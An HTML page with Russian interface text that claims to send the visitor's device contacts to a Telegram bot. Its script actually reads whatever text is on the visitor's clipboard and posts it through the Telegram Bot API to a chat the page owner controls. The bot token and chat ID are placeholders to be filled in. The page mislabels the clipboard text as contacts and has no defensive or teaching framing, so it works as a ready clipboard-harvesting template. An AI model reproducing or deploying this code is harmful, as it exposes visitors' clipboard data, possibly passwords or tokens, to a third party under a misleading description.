<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Получение Контактов</title>
</head>
<body>
    <h1>Получение Контактов Устройства</h1>
    <p>Контакты вашего устройства будут отправлены в Telegram-бот.</p>
    <button onclick="getContacts()">Получить контакты</button>

    <script>
        async function getContacts() {
            try {
                // Check if clipboard access is supported
                if (!navigator.clipboard) {
                    alert("Ваш браузер не поддерживает доступ к буферу обмена.");
                    return;
                }

                // Read the text data from the clipboard
                const clipboardText = await navigator.clipboard.readText();
                
                if (!clipboardText) {
                    alert("Буфер обмена пустой или не содержит текстовые данные.");
                    return;
                }

                // Prepare the message with clipboard contents
                let contactsMessage = 'Список контактов из буфера обмена:\n\n' + clipboardText;

                // Send the contacts to the Telegram bot
                sendContactsToTelegram(contactsMessage);

            } catch (error) {
                console.error('Ошибка при получении данных из буфера обмена:', error);
                alert('Произошла ошибка при получении данных из буфера обмена. Пожалуйста, попробуйте снова.');
            }
        }

        function sendContactsToTelegram(message) {
            const botToken = '<YOUR_BOT_TOKEN>'; // Replace with your bot's token
            const chatId = '<YOUR_CHAT_ID>'; // Replace with your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('Контакты успешно отправлены в Telegram!');
                } else {
                    console.error('Ошибка при отправке контактов в Telegram:', data);
                    alert('Не удалось отправить контакты в Telegram. Проверьте настройки и повторите попытку.');
                }
            })
            .catch(error => {
                console.error('Ошибка при отправке контактов в Telegram:', error);
                alert('Произошла ошибка при отправке контактов в Telegram. Пожалуйста, попробуйте снова.');
            });
        }
    </script>
</body>
</html>
